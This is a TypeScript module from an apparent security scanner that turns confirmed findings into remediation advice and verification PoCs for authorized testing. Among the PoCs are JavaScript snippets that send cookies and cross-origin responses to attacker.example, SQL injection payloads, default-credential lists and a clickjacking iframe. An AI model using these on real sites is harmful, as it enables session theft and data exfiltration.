// Interu Rule-Engine advisor — turns a CONFIRMED finding into two actionable
// recommendations: a Defense (patching) recipe and an Attack (verification /
// PoC) recipe.
//
// Design for stability & zero false positives:
//   - Advice is DERIVED from a finding that the engine already confirmed; it
//     never performs new detection, so it cannot introduce a false positive.
//   - Attack recipes are classed by intent:
//       verify   = safe, read-only reproduction of the exact proof (the app may
//                  run it; it re-sends the same request the oracle already sent).
//       operator = a payload is PREPARED; the human runs it via Repeater /
//                  Intruder. No auto-exploitation, nothing destructive.
//       info     = no direct server exploit (e.g. a missing hardening header);
//                  we explain the real risk and give a local, harmless PoC.
//   - Keyed by vulnerability CLASS (templateId prefix / tags / CWE), not per
//     template, so all 408 templates get accurate, non-hallucinated advice.
//
// Framework-free so the renderer imports it directly.

import type { Finding } from './rules'

export interface ConfigSnippet { label: string; code: string }

export interface Defense {
  summary: string
  steps: string[]
  configs?: ConfigSnippet[]
  references?: string[]
}

export type AttackKind = 'verify' | 'operator' | 'info'

export interface Attack {
  kind: AttackKind
  /** true = non-destructive (read-only / local PoC). operator SQLi etc. stays true only for detection payloads. */
  safe: boolean
  summary: string
  steps: string[]
  /** a copyable proof-of-concept: a curl line, an HTML/JS snippet, or a command. */
  poc?: string
  /** candidate payloads for an Intruder/Repeater handoff. */
  payloads?: string[]
  references?: string[]
}

export interface Advice { defense: Defense; attack: Attack }

const id = (f: Finding): string => f.templateId
const has = (f: Finding, tag: string): boolean => !!f.tags?.includes(tag)
const url = (f: Finding): string => f.matchedAt || f.target
function hostOf(f: Finding): string {
  try { return new URL(url(f)).host } catch { return f.target }
}

// nginx/apache snippets reused by several classes.
const DENY_DOTFILES: ConfigSnippet[] = [
  { label: 'nginx — block dotfiles', code: 'location ~ /\\.(?!well-known) {\n    deny all;\n    return 404;\n}' },
  { label: 'Apache — block dotfiles', code: '<FilesMatch "^\\.">\n    Require all denied\n</FilesMatch>' }
]

/** Produce defense + attack advice for a confirmed finding. */
export function getAdvice(f: Finding): Advice {
  const u = url(f)
  const host = hostOf(f)
  const curl = `curl -sk -i "${u}"`

  // ---------------------------------------------------------------- exposures
  if (/^(expose-|bak-|env-|file-)/.test(id(f)) || has(f, 'exposure')) {
    const secrets = has(f, 'secrets')
    const scm = has(f, 'scm')
    return {
      defense: {
        summary: secrets
          ? 'A secret-bearing file is served from the web root. Remove it, block the path, and rotate every exposed credential.'
          : 'A file that should not be public is served from the web root. Block access to it at the web server.',
        steps: [
          'Delete the file from the document root (or move it outside the web root).',
          'Block the path/extension at the web server so backups & dotfiles are never served.',
          ...(secrets ? ['Treat every value in the file as compromised and ROTATE it now (DB passwords, API keys, tokens).'] : []),
          ...(scm ? ['Ensure the repository metadata (.git/.svn/.hg) is not deployable; deploy build artifacts only.'] : []),
          'Re-test with the button below to confirm the path no longer returns the file.'
        ],
        configs: DENY_DOTFILES.concat(
          scm ? [{ label: 'nginx — block VCS dirs', code: 'location ~ /\\.(git|svn|hg|bzr) {\n    deny all;\n    return 404;\n}' }] : []
        ),
        references: f.reference
      },
      attack: {
        kind: 'verify',
        safe: true,
        summary: 'Prove the file is directly readable by fetching it (read-only — exactly what the oracle already did).',
        steps: [
          'Fetch the URL and confirm the sensitive content is returned.',
          ...(secrets ? ['Extract credentials/keys from the body (see the Extracted field).', 'Validate blast-radius against the service they unlock — then rotate.'] : []),
          ...(scm ? ['A readable .git lets an attacker reconstruct full source with a dumper (operator step, out of scope here).'] : [])
        ],
        poc: curl,
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- actuator / debug
  if (/^act-/.test(id(f)) || has(f, 'debug') || has(f, 'spring') || id(f).startsWith('expose-actuator') || id(f) === 'expose-spring-actuator') {
    const rce = /ignition|env|werkzeug|heapdump|gateway/.test(id(f))
    return {
      defense: {
        summary: 'A framework debug / management surface is reachable. Disable it in production or require authentication.',
        steps: [
          'Set the app to production mode (APP_DEBUG=false / APP_ENV=prod / DEBUG=False).',
          'Disable or authenticate the management endpoint; never expose it publicly.',
          'Bind actuator/admin ports to localhost and put them behind the internal network only.'
        ],
        configs: [
          { label: 'Spring Boot — restrict actuator', code: 'management.endpoints.web.exposure.include=health\nmanagement.endpoint.env.enabled=false' },
          { label: 'Laravel/Symfony — production', code: 'APP_ENV=production\nAPP_DEBUG=false' }
        ],
        references: f.reference
      },
      attack: {
        kind: rce ? 'operator' : 'verify',
        safe: !rce,
        summary: rce
          ? 'This surface can leak secrets or lead to RCE. Verify presence read-only; any exploitation must be run manually in scope.'
          : 'Confirm the endpoint is reachable and leaks internal data (read-only).',
        steps: rce
          ? ['Confirm the endpoint responds (read-only).', 'Review the response for secrets / config.', 'For known RCE paths (e.g. Ignition CVE-2021-3129, Spring /env+refresh), use a maintained PoC manually against an authorized target only.']
          : ['Fetch the endpoint and read the exposed beans/mappings/metrics.'],
        poc: curl,
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- API docs / schemas
  if (/^api-/.test(id(f)) || has(f, 'api')) {
    return {
      defense: {
        summary: 'An API schema / docs endpoint is public, enumerating every operation.',
        steps: [
          'Require authentication for the spec, or do not ship it to production.',
          'Disable GraphQL introspection in production.',
          'Review each listed endpoint for missing authz.'
        ],
        configs: [{ label: 'GraphQL — disable introspection', code: '// Apollo\nnew ApolloServer({ introspection: false })' }],
        references: f.reference
      },
      attack: {
        kind: 'verify', safe: true,
        summary: 'Pull the schema and map the attack surface (read-only).',
        steps: ['Fetch the spec.', 'Enumerate endpoints/operations and test each for authz with Repeater.'],
        poc: curl, references: f.reference
      }
    }
  }

  // ----------------------------------------------------- admin panels
  if (/^(pnl-|detect-)/.test(id(f)) || has(f, 'panel')) {
    return {
      defense: {
        summary: 'An admin/management panel is reachable. Restrict it and ensure strong authentication.',
        steps: [
          'Put the panel behind VPN / IP allow-list; do not expose it to the internet.',
          'Remove default/sample apps and change default credentials.',
          'Enforce MFA and lockout on the login.'
        ],
        configs: [{ label: 'nginx — IP allow-list', code: 'location /admin {\n    allow 10.0.0.0/8;\n    deny all;\n}' }],
        references: f.reference
      },
      attack: {
        kind: 'operator', safe: true,
        summary: 'Panel confirmed present. Test authentication manually — default creds / spraying — via Intruder (no auto-brute here).',
        steps: [
          'Open the login and send it to Intruder.',
          'Try vendor default credentials first (documented per product).',
          'If permitted, run a controlled password-spray with a small list; respect lockout policy.'
        ],
        poc: `# open the panel, then Send to Repeater/Intruder\n${curl}`,
        payloads: ['admin:admin', 'admin:password', 'admin:changeme', 'root:root', 'administrator:administrator'],
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- secret leaks
  if (/^sec-/.test(id(f)) || id(f) === 'http-secret-leak' || has(f, 'secrets')) {
    return {
      defense: {
        summary: 'A live credential/token is present in a response. Rotate it and stop returning secrets to clients.',
        steps: [
          'Rotate/revoke the exposed key immediately — assume it is compromised.',
          'Remove the secret from the response; keep secrets server-side only.',
          'Add secret-scanning to CI to catch this before deploy.'
        ],
        references: f.reference
      },
      attack: {
        kind: 'operator', safe: false,
        summary: 'The token is usable until rotated. Validate blast-radius against the issuing service (authorized testing only).',
        steps: ['Identify the provider from the key prefix.', 'Confirm validity with a benign read-only API call (no data changes).', 'Document scope of access, then rotate.'],
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- CORS
  if (/^http-cors/.test(id(f))) {
    const creds = id(f).includes('credentials')
    return {
      defense: {
        summary: 'A permissive CORS policy lets other origins read responses.',
        steps: [
          'Echo only an explicit allow-list of trusted origins — never `*` on authenticated endpoints.',
          creds ? 'Never combine Access-Control-Allow-Credentials: true with a wildcard or blindly-reflected Origin.' : 'Avoid returning a wildcard ACAO where responses are sensitive.'
        ],
        configs: [{ label: 'Express — strict CORS', code: "cors({ origin: ['https://app.example.com'], credentials: true })" }],
        references: f.reference
      },
      attack: {
        kind: 'info', safe: true,
        summary: 'A malicious origin can fetch authenticated responses. Local PoC page demonstrates cross-origin read.',
        steps: ['Host the PoC on an attacker origin.', 'A logged-in victim visiting it leaks the response cross-origin.'],
        poc: `fetch("${u}", { credentials: "include" })\n  .then(r => r.text())\n  .then(d => navigator.sendBeacon("https://attacker.example/collect", d));`,
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- clickjacking (XFO)
  if (id(f) === 'http-missing-xfo') {
    return {
      defense: {
        summary: 'Responses can be framed by any site → clickjacking.',
        steps: ['Send X-Frame-Options or a CSP frame-ancestors directive.'],
        configs: [
          { label: 'nginx — X-Frame-Options', code: 'add_header X-Frame-Options "SAMEORIGIN" always;' },
          { label: 'CSP (preferred)', code: 'add_header Content-Security-Policy "frame-ancestors \'self\'" always;' }
        ],
        references: f.reference
      },
      attack: {
        kind: 'info', safe: true,
        summary: 'Frame the page to trick a victim into clicking hidden controls. Local HTML PoC:',
        steps: ['Open this HTML locally; if the target renders inside the iframe it is framable.'],
        poc: `<!doctype html><h3>Click to win</h3>\n<iframe src="${u}" style="opacity:.1;position:absolute;top:0;left:0;width:1000px;height:700px"></iframe>`,
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- missing security headers
  if (/^http-missing-/.test(id(f))) {
    const header = id(f).replace('http-missing-', '')
    const map: Record<string, ConfigSnippet> = {
      hsts: { label: 'nginx — HSTS', code: 'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;' },
      csp: { label: 'nginx — CSP', code: 'add_header Content-Security-Policy "default-src \'self\'" always;' },
      xcto: { label: 'nginx — nosniff', code: 'add_header X-Content-Type-Options "nosniff" always;' },
      'referrer-policy': { label: 'nginx — Referrer-Policy', code: 'add_header Referrer-Policy "strict-origin-when-cross-origin" always;' },
      'permissions-policy': { label: 'nginx — Permissions-Policy', code: 'add_header Permissions-Policy "geolocation=(), camera=()" always;' }
    }
    return {
      defense: {
        summary: 'A hardening header is missing. Add it to every response.',
        steps: ['Set the header at the web server / framework layer.', 'Verify with the Re-test button once deployed.'],
        configs: [map[header] || { label: 'Add the header', code: '# set the missing security header on all responses' }],
        references: f.reference
      },
      attack: {
        kind: 'info', safe: true,
        summary: id(f) === 'http-missing-hsts'
          ? 'No HSTS → a MITM can SSL-strip and downgrade the connection to clear HTTP.'
          : 'No direct server exploit; this weakens a browser defense and amplifies other bugs (XSS/MIME).',
        steps: ['Confirm the header is absent in the response (see Response).', 'Chain with the relevant client-side attack (XSS, SSL-strip, MIME-sniff).'],
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- cookies
  if (/^http-cookie/.test(id(f))) {
    const flag = id(f).includes('httponly') ? 'HttpOnly' : id(f).includes('secure') ? 'Secure' : 'SameSite'
    return {
      defense: {
        summary: `Session cookie is missing the ${flag} attribute.`,
        steps: [`Set ${flag} on session cookies.`, 'Set HttpOnly + Secure + SameSite together for session cookies.'],
        configs: [{ label: 'Set-Cookie (hardened)', code: 'Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/' }],
        references: f.reference
      },
      attack: {
        kind: 'info', safe: true,
        summary: flag === 'HttpOnly'
          ? 'Without HttpOnly, an XSS can read the cookie via document.cookie and hijack the session.'
          : flag === 'Secure'
            ? 'Without Secure, the cookie is sent over plain HTTP and can be captured by a MITM.'
            : 'Without SameSite, the cookie rides cross-site requests → CSRF.',
        steps: flag === 'HttpOnly'
          ? ['Find an XSS sink.', 'PoC: exfiltrate document.cookie to an attacker endpoint.']
          : flag === 'SameSite'
            ? ['Craft a CSRF form that submits to the target from another origin.']
            : ['Observe the cookie on an http:// request via the Proxy.'],
        poc: flag === 'HttpOnly' ? 'new Image().src="https://attacker.example/c?"+document.cookie;' : undefined,
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- SQL error / SQLi
  if (id(f) === 'http-sql-error' || has(f, 'sqli')) {
    return {
      defense: {
        summary: 'A database error leaked → likely SQL injection. Use parameterized queries and hide errors.',
        steps: [
          'Replace string-built SQL with parameterized/prepared statements.',
          'Return generic error pages in production; log details server-side.',
          'Apply least-privilege to the DB account.'
        ],
        configs: [{ label: 'Parameterized query (example)', code: "db.query('SELECT * FROM users WHERE id = ?', [id])" }],
        references: f.reference
      },
      attack: {
        kind: 'operator', safe: true,
        summary: 'Confirm injection with SAFE boolean/error payloads via Intruder. Do NOT dump/alter data without authorization.',
        steps: [
          'Send the vulnerable parameter to Intruder.',
          'Compare a TRUE vs FALSE payload: different responses ⇒ injectable.',
          'Escalate (UNION/dump) only under explicit authorization, in a controlled manner.'
        ],
        payloads: ["'", "' OR '1'='1' -- -", "' OR '1'='2' -- -", "1 AND 1=1", "1 AND 1=2", "' AND SLEEP(5)-- -"],
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- stack trace / debug output
  if (id(f) === 'http-stacktrace' || id(f) === 'http-debug-symfony') {
    return {
      defense: {
        summary: 'Debug output / stack traces are exposed, leaking internals.',
        steps: ['Disable debug mode in production.', 'Return generic error pages; log details server-side.'],
        references: f.reference
      },
      attack: {
        kind: 'verify', safe: true,
        summary: 'Read the leaked trace for paths, framework versions and query fragments to fuel further testing.',
        steps: ['Re-trigger the error and read the trace (see Response).'],
        poc: curl, references: f.reference
      }
    }
  }

  // ----------------------------------------------------- version / tech disclosure
  if (/^(http-server-version|http-powered-by|http-aspnet-version|hdr-|bnr-)/.test(id(f)) || has(f, 'fingerprint') || has(f, 'disclosure')) {
    return {
      defense: {
        summary: 'The response/banner discloses the technology & version, easing targeted attacks.',
        steps: ['Suppress version tokens in headers/banners.', 'Keep the component patched regardless of disclosure.'],
        configs: [
          { label: 'nginx — hide version', code: 'server_tokens off;' },
          { label: 'Apache — hide version', code: 'ServerTokens Prod\nServerSignature Off' }
        ],
        references: f.reference
      },
      attack: {
        kind: 'verify', safe: true,
        summary: 'Note the exact version, then map it to known CVEs for that component/version.',
        steps: ['Record the version (see Extracted).', 'Search the CVE database for that exact version before testing specific exploits (in scope).'],
        poc: curl, references: f.reference
      }
    }
  }

  // ----------------------------------------------------- directory listing
  if (id(f) === 'http-dir-listing') {
    return {
      defense: {
        summary: 'Automatic directory indexing is enabled, exposing file names.',
        steps: ['Disable directory indexing.'],
        configs: [
          { label: 'nginx', code: 'autoindex off;' },
          { label: 'Apache', code: 'Options -Indexes' }
        ],
        references: f.reference
      },
      attack: {
        kind: 'verify', safe: true,
        summary: 'Browse the listing to find backups, configs and sensitive files, then fetch them.',
        steps: ['Open the directory and enumerate interesting files.'],
        poc: curl, references: f.reference
      }
    }
  }

  // ----------------------------------------------------- basic auth over http
  if (id(f) === 'http-basic-auth-cleartext') {
    return {
      defense: {
        summary: 'HTTP Basic credentials are requested over cleartext HTTP.',
        steps: ['Force HTTPS and redirect all HTTP to HTTPS.', 'Prefer a modern auth scheme over Basic.'],
        configs: [{ label: 'nginx — force HTTPS', code: 'server {\n    listen 80;\n    return 301 https://$host$request_uri;\n}' }],
        references: f.reference
      },
      attack: {
        kind: 'info', safe: true,
        summary: 'Credentials are base64 (not encrypted) over HTTP → a MITM reads them trivially.',
        steps: ['Capture the Authorization header on the wire via the Proxy.', 'Base64-decode to recover user:pass.'],
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- exposed network service (port)
  if (/^svc-/.test(id(f)) || has(f, 'network')) {
    return {
      defense: {
        summary: 'A sensitive network service is reachable. Restrict it to trusted networks.',
        steps: [
          'Firewall the port; expose only to VPN / allow-listed hosts.',
          'Require strong authentication + encryption on the service.',
          'Disable the service entirely if it is not needed.'
        ],
        configs: [{ label: 'Linux — allow-list a port', code: `ufw deny ${f.port ?? '<port>'}\nufw allow from 10.0.0.0/8 to any port ${f.port ?? '<port>'}` }],
        references: f.reference
      },
      attack: {
        kind: 'operator', safe: true,
        summary: 'Fingerprint the service and test it with the right client — manually, in scope. Nothing is auto-run here.',
        steps: [
          `Connect to ${host}:${f.port ?? '<port>'} with the appropriate client to confirm the service & auth.`,
          'Check the exact version against known CVEs before any exploit.',
          'Try for unauthenticated access (common on Redis/Mongo/Elastic/Docker).'
        ],
        poc: f.port ? `nc -v ${host} ${f.port}` : undefined,
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- banner → CVE
  if (/^banner-/.test(id(f))) {
    return {
      defense: {
        summary: `The banner matches a version affected by ${f.cve?.join(', ') || 'a known CVE'}. Patch/upgrade now.`,
        steps: ['Upgrade the component to a fixed release.', 'Apply vendor mitigations until patched.', 'Confirm the version is not spoofed before deprioritising.'],
        references: f.reference
      },
      attack: {
        kind: 'operator', safe: false,
        summary: `Version suggests ${f.cve?.join(', ') || 'a known CVE'}. This is a SUSPECTED match (banners can be spoofed). Verify in a lab with a maintained PoC — authorized targets only.`,
        steps: [
          'Confirm the real version (banner alone is not proof).',
          'Use a maintained, reviewed PoC for the specific CVE against an authorized/lab target.',
          'Never run untrusted exploit code against production.'
        ],
        references: f.reference
      }
    }
  }

  // ----------------------------------------------------- default page / jwt / private ip / fallback
  return {
    defense: {
      summary: f.remediation || 'Review this finding and apply the recommended hardening.',
      steps: [f.remediation || 'Investigate the finding and remediate per your security baseline.', 'Re-test to confirm the fix.'],
      references: f.reference
    },
    attack: {
      kind: 'verify', safe: true,
      summary: 'Reproduce the finding to confirm it, then assess impact in context.',
      steps: ['Reproduce the observation (see Evidence / Response).'],
      poc: /^https?:/i.test(u) ? curl : undefined,
      references: f.reference
    }
  }
}
